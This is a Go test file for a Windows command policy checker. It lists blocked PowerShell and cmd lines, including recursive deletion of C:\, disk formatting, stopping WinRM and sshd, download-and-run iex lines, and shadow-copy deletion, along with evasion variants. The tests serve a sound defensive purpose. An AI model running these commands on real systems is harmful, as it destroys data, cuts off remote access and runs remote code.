package policy

import (
	"strings"
	"testing"
)

func TestWindowsRules(t *testing.T) {
	blocked := map[string]string{
		`Remove-Item -Recurse -Force C:\`:                           "win-rm-root",
		`Remove-Item C:\* -Recurse`:                                 "win-rm-root",
		`rm -r 'C:\Windows'`:                                        "win-rm-root",
		`Get-Date; Remove-Item -Path "C:\Program Files" -Rec`:       "win-rm-root",
		`ri -Recurse $env:SystemDrive\`:                             "win-rm-root",
		`cmd /c rd /s /q C:\`:                                       "win-rm-root",
		`rd /s /q c:\users`:                                         "win-rm-root",
		`Re` + "`" + `move-Item -Recurse C:\`:                       "win-rm-root",
		`Format-Volume -DriveLetter D`:                              "win-format",
		`Clear-Disk -Number 1 -RemoveData`:                          "win-format",
		`format d: /q`:                                              "win-format",
		`diskpart /s wipe.txt`:                                      "win-format",
		`Stop-Computer -Force`:                                      "win-power",
		`Restart-Computer`:                                          "win-power",
		`shutdown /r /t 0`:                                          "win-power",
		`Stop-Service -Name sshd`:                                   "win-remote-access",
		`Stop-Service WinRM -Force`:                                 "win-remote-access",
		`Set-Service -Name sshd -StartupType Disabled`:              "win-remote-access",
		`net stop winrm`:                                            "win-remote-access",
		`Disable-PSRemoting -Force`:                                 "win-remote-access",
		`Set-NetFirewallProfile -All -DefaultInboundAction Block`:   "win-firewall-block",
		`netsh advfirewall reset`:                                   "win-firewall-block",
		`Remove-LocalUser -Name bob`:                                "win-user-delete",
		`net user bob /delete`:                                      "win-user-delete",
		`powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA`:  "win-encoded",
		`iwr https://x.example/a.ps1 | iex`:                         "win-download-run",
		`IEX (New-Object Net.WebClient).DownloadString('http://x')`: "win-download-run",
		`vssadmin delete shadows /all /quiet`:                       "win-backups",
		`bcdedit /set {default} recoveryenabled No`:                 "win-backups",
		`Remove-Item -Recurse HKLM:\SOFTWARE`:                       "win-registry-hive",
	}
	for cmd, id := range blocked {
		if !hasRule(Check(cmd, nil), id) {
			t.Errorf("%q: want rule %s, got %v", cmd, id, Check(cmd, nil))
		}
	}
	allowed := []string{
		`Get-ChildItem C:\`,
		`Remove-Item C:\temp\old.log`,
		`Remove-Item -Recurse C:\inetpub\logs\old`,
		`Get-Service sshd`,
		`Restart-Service W3SVC`,
		`Start-Service sshd`,
		`Set-Service -Name sshd -StartupType Automatic`,
		`rm -rf /tmp/build`,
		`Get-Content C:\Windows\System32\drivers\etc\hosts`,
		`format-table Name`,
		`Get-Disk | Format-List`,
	}
	for _, cmd := range allowed {
		if hits := Check(cmd, nil); len(hits) > 0 {
			t.Errorf("%q: want no rule, got %v", cmd, hits)
		}
	}
}

func hasRule(hits []Rule, id string) bool {
	for _, h := range hits {
		if h.ID == id {
			return true
		}
	}
	return false
}

func TestPSReadOnly(t *testing.T) {
	reads := []string{
		`Get-Service | Where-Object { $_.Status -eq 'Running' } | Select-Object Name`,
		`Get-ChildItem C:\inetpub -Recurse | Measure-Object Length -Sum`,
		`hostname; whoami; ipconfig /all`,
		`Get-WinEvent -LogName System -MaxEvents 20 | Format-Table -AutoSize`,
		`Set-Location C:\inetpub; Get-ChildItem`,
	}
	for _, s := range reads {
		if why := PSReadOnly(s); why != "" {
			t.Errorf("%q: want read-only, got %q", s, why)
		}
	}
	writes := []string{
		// these were read-only under the denylist; the subset refuses them
		`Get-Content C:\app\app.log -Tail 50 2>$null`,
		`Get-Process 2>&1 | Out-String`,
		`$x = Get-Date; "now: $($x.ToString('o'))"`,
		`'Remove-Item is only text here'`,
		"# Remove-Item C:\\x\nGet-Item C:\\x",
		`<# Stop-Service x #> Get-Service x`,
		`Test-Path C:\x; [Environment]::GetEnvironmentVariable('PATH')`,
		`Invoke-WebRequest https://example.com/health -UseBasicParsing`,
		// these change something
		`Remove-Item C:\x`,
		`Get-Item C:\x | Remove-Item`,
		`Stop-Service W3SVC`,
		`Get-Date > C:\out.txt`,
		`Get-Date >> 'C:\out.txt'`,
		`Get-Process | Out-File C:\p.txt`,
		`& $cmd`,
		`& ('Remove-' + 'Item') C:\x`,
		`. $script`,
		`iex 'Remove-Item C:\x'`,
		`Invoke-Expression $s`,
		`Invoke-Command -ScriptBlock { Get-Date }`,
		`[IO.File]::WriteAllText('C:\x', 'y')`,
		`[System.IO.File]::Delete('C:\x')`,
		`(Get-Process notepad).Kill()`,
		`$x = New-Item C:\x -ItemType File`,
		`if ($true) { Set-Content C:\x 'y' }`,
		`"text $(Remove-Item C:\x)"`,
		`net stop W3SVC`,
		`sc.exe config W3SVC start= disabled`,
		`reg add HKLM\SOFTWARE\X /v Y /d 1`,
		`schtasks /create /tn x /tr calc /sc once /st 00:00`,
		`ipconfig /release`,
		`cmd /c del C:\x`,
		`Invoke-WebRequest https://x.example/a.zip -OutFile C:\a.zip`,
		`kill 1234`,
		`Re` + "`" + `move-Item C:\x`,
		`Get-Item ‘C:\x’; Remove-Item C:\y`,
	}
	for _, s := range writes {
		if PSReadOnly(s) == "" {
			t.Errorf("%q: want a read-only violation", s)
		}
	}
}

func TestPSOnlyReads(t *testing.T) {
	for _, s := range []string{
		`Get-Service | Where-Object Status -eq Running`,
		`Get-ChildItem C:\x | Sort-Object LastWriteTime | Select-Object -Last 5`,
		`hostname; whoami`,
	} {
		if !PSOnlyReads(s) {
			t.Errorf("%q: want known reads", s)
		}
	}
	for _, s := range []string{
		`(Get-Date).ToUniversalTime().ToString('o')`, // was a known read; .NET calls are refused now
		`C:\tools\report.exe`,
		`Remove-Item C:\x`,
		`$sb.Append('x')`,
		`Invoke-WebRequest https://example.com`,
		`Import-Module ActiveDirectory; Get-ADUser bob`,
		`ipconfig /flushdns`,
	} {
		if PSOnlyReads(s) {
			t.Errorf("%q: want not known to only read", s)
		}
	}
}

func FuzzPSReadOnly(f *testing.F) {
	for _, s := range []string{`Get-Item 'a''b'`, `"$(x"`, "@'\nx\n'@", "<# x", `& `, `‘x’’y’`} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, s string) {
		why := PSReadOnly(s)
		if PSOnlyReads(s) && why != "" {
			t.Fatalf("%q: known reads, but refused under --read-only (%s)", s, why)
		}
		if why == "" && strings.ContainsAny(s, "`@&>") {
			t.Fatalf("%q: accepted with a backtick, @, & or >", s)
		}
		for i := 0; why == "" && i < len(s); i++ {
			if s[i] >= 0x80 {
				t.Fatalf("%q: accepted with a character outside ASCII", s)
			}
		}
	})
}

func TestWindowsRulesNestedAndPiped(t *testing.T) {
	for _, cmd := range []string{
		`Remove-Item C:\Windows\System32 -Recurse -Force`,
		`rd /s /q C:\Windows\SysWOW64`,
		`Remove-Item -Recurse $env:SystemRoot\System32`,
		`$null = Remove-Item C:\ -Recurse -Force`,
		`$r=rm -r C:\Users`,
		`return Remove-Item C:\ -Recurse`,
		`Get-ChildItem C:\ | Remove-Item -Recurse -Force`,
		`gci C:\Windows -Recurse | rm -Force`,
		`ls 'C:\Program Files' |% { $_ } | Remove-Item`,
	} {
		if !hasRule(Check(cmd, nil), "win-rm-root") {
			t.Errorf("%q: want rule win-rm-root, got %v", cmd, Check(cmd, nil))
		}
	}
	for _, cmd := range []string{
		`Get-ChildItem C:\temp | Remove-Item -Recurse`,
		`Get-ChildItem C:\ | Select-Object Name`,
		`$x = Get-ChildItem C:\Windows\System32`,
		`Remove-Item C:\Windows\System32\drivers\x.log`,
	} {
		if hits := Check(cmd, nil); len(hits) > 0 {
			t.Errorf("%q: want no rule, got %v", cmd, hits)
		}
	}
}
